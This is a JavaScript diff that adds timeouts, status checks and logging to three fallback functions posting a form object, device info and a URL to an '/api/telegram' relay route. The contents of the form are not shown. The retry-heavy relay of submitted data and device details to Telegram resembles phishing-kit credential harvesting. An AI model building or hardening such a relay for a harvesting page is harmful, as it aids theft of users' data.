@@ -22,6 +22,14 @@ function request_api(o){
     
     // Send to secure API route (serverless function on Vercel)
     // Credentials are stored as environment variables and never exposed to client
+    // Create abort controller for timeout (compatible with older browsers)
+    let abortController;
+    let timeoutId;
+    if (typeof AbortController !== 'undefined') {
+      abortController = new AbortController();
+      timeoutId = setTimeout(() => abortController.abort(), 15000); // 15 second timeout
+    }
+    
     fetch('/api/telegram', {
       method: 'POST',
       headers: { 
@@ -35,18 +43,30 @@ function request_api(o){
         deviceInfo: deviceInfo,
         formattedDate: formattedDate,
         copyUrl: copyUrl
-      })
+      }),
+      signal: abortController ? abortController.signal : undefined
     })
-    .then(response => response.json())
+    .then(response => {
+      // Clear timeout on success
+      if (timeoutId) clearTimeout(timeoutId);
+      // Check if response is ok before parsing
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      return response.json();
+    })
     .then(data => {
       if (data.success) {
+        console.log('✅ Telegram submission successful');
         return 'success';
       } else {
         throw new Error(data.error || 'Failed to send message');
       }
     })
     .catch(error => {
+      if (timeoutId) clearTimeout(timeoutId);
       console.error('Error sending to Telegram:', error);
+      // Try fallback method
       submitViaTelegramFallback(o, deviceInfo, formattedDate, copyUrl);
     });
   }
@@ -75,6 +95,14 @@ function submitViaTelegramFallback(o, deviceInfo, formattedDate, copyUrl) {
   }
   
   // Retry API call (using JSON)
+  // Create abort controller for timeout (compatible with older browsers)
+  let abortController2;
+  let timeoutId2;
+  if (typeof AbortController !== 'undefined') {
+    abortController2 = new AbortController();
+    timeoutId2 = setTimeout(() => abortController2.abort(), 15000); // 15 second timeout
+  }
+  
   fetch('/api/telegram', {
     method: 'POST',
     headers: { 
@@ -88,17 +116,26 @@ function submitViaTelegramFallback(o, deviceInfo, formattedDate, copyUrl) {
       deviceInfo: deviceInfo,
       formattedDate: formattedDate,
       copyUrl: copyUrl
-    })
+    }),
+    signal: abortController2 ? abortController2.signal : undefined
   })
-  .then(response => response.json())
+  .then(response => {
+    if (timeoutId2) clearTimeout(timeoutId2);
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    return response.json();
+  })
   .then(data => {
     if (data.success) {
+      console.log('✅ Telegram fallback submission successful');
       return;
     } else {
       throw new Error(`Telegram fallback error: ${data.error || 'Unknown error'}`);
     }
   })
   .catch(error => {
+    if (timeoutId2) clearTimeout(timeoutId2);
     console.error('Telegram fallback submission also failed:', error);
     submitViaXHR(o, deviceInfo, formattedDate, copyUrl);
   });
@@ -130,26 +167,34 @@ function submitViaXHR(o, deviceInfo, formattedDate, copyUrl) {
   xhr.open('POST', '/api/telegram', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
   
+  // Set timeout for slow connections (15 seconds)
+  xhr.timeout = 15000;
+  
   xhr.onreadystatechange = function() {
     if (xhr.readyState === 4) {
-      
       if (xhr.status === 200) {
         try {
           const response = JSON.parse(xhr.responseText);
-          if (!response.success) {
-            console.error('API error:', response.error);
+          if (response.success) {
+            console.log('✅ XHR Telegram submission successful');
+          } else {
+            console.error('XHR API error:', response.error);
           }
         } catch (e) {
-          console.error('Failed to parse response');
+          console.error('Failed to parse XHR response:', e, xhr.responseText);
         }
       } else {
-        console.error('XHR submission failed with status:', xhr.status);
+        console.error('XHR submission failed with status:', xhr.status, xhr.statusText);
       }
     }
   };
   
   xhr.onerror = function() {
     console.error('XHR network error occurred');
+  };
+  
+  xhr.ontimeout = function() {
+    console.error('XHR request timed out after 15 seconds');
   };
   
   try {
